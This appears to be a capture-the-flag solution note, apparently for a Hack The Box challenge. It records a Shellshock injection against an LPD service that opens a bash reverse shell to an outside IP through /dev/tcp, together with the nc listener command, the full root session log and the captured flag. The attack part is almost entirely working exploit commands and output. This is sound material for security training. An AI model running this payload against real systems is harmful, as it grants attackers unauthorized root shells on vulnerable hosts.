#https://drive.google.com/file/d/1Drbe4ZsXXRX2-bT_-N6uPu8EJzAkGIYb/view
#https://github.com/MrCl0wnLab/ShellShockHunter#source-file--exploits-

#nc -nlvp 9002
#python3 lpdtest.py --port 32345 46.101.14.124 in '() { :; }; echo ; /bin/bash -c "bash -i >& /dev/tcp/178.62.102.205/9002 0>&1"'

'''
Listening on 0.0.0.0 9002
Connection received on 46.101.14.124 43130
bash: no job control in this shell
root@hwline-1061206-7b89fb8767-wlkwj:/# ls
ls
bash_4.1-3_amd64.deb
bin
boot
dev
etc
home
lib
lib64
media
mnt
opt
proc
root
run
sbin
srv
sys
tmp
usr
var
root@hwline-1061206-7b89fb8767-wlkwj:/# id
id
uid=0(root) gid=0(root) groups=0(root)
root@hwline-1061206-7b89fb8767-wlkwj:/# cd /root
cd /root
root@hwline-1061206-7b89fb8767-wlkwj:~# ls
ls
server.py
root@hwline-1061206-7b89fb8767-wlkwj:~# cd
cd
root@hwline-1061206-7b89fb8767-wlkwj:~# ls
ls
server.py
root@hwline-1061206-7b89fb8767-wlkwj:~# cd /
cd /
root@hwline-1061206-7b89fb8767-wlkwj:/# find . -name flag.txt
find . -name flag.txt
./opt/flag.txt
root@hwline-1061206-7b89fb8767-wlkwj:/# cat /opt/flag.txt
cat /opt/flag.txt
HTB{l00t1ng_lpd_1s_w00t_39gc4!!}
'''
